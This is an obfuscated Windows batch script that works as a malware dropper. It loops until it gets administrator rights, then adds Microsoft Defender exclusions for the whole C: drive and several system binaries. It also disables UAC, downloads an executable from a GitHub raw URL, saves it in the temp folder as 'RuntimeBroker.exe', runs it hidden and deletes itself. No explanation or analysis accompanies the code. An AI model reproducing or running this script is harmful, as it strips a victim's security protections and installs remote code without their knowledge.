@echo off & setlocal enableDelayedExpansion
set "HMe=2>&1" & set "BiSUc=NET" & set "Mujx=SESSION" & set "UNTc=>nul"
%BiSUc% %Mujx% %UNTc% %HMe%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "LEzYe=baz" & set "jwMcj=foo" & set "QENBI=bar" & set "MhL=qux" & rem wucNyRD OICxle mTK
set "MBG=powershell -ExecutionPolicy Bypass -Command"
set "EBSHy=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "WeoNI='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "nHuNC='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!MBG! "!EBSHy! !WeoNI! !nHuNC!" %UNTc% %HMe%
set "fed=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "qpJ=-Name 'EnableLUA' -Value 0"
!MBG! "!fed! !qpJ!" %UNTc% %HMe%
set "aYuk=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!MBG! "!aYuk!" %UNTc% %HMe%
if !errorlevel! neq 0 (goto %a%)
set "SFJ=timeout /t" & !SFJ! 2 %UNTc% %HMe%
set "dwBBM=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "KFnM=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "Zsv=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!MBG! "!dwBBM! !KFnM! !Zsv!" %UNTc% %HMe%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!SFJ! 1 %UNTc% %HMe% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %UNTc% %HMe%
del /f /q "%~f0" %UNTc% %HMe%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %UNTc% %HMe%
if !errorlevel! neq 0 (!SFJ! 3 %UNTc% %HMe% & goto %b%)
exit /b
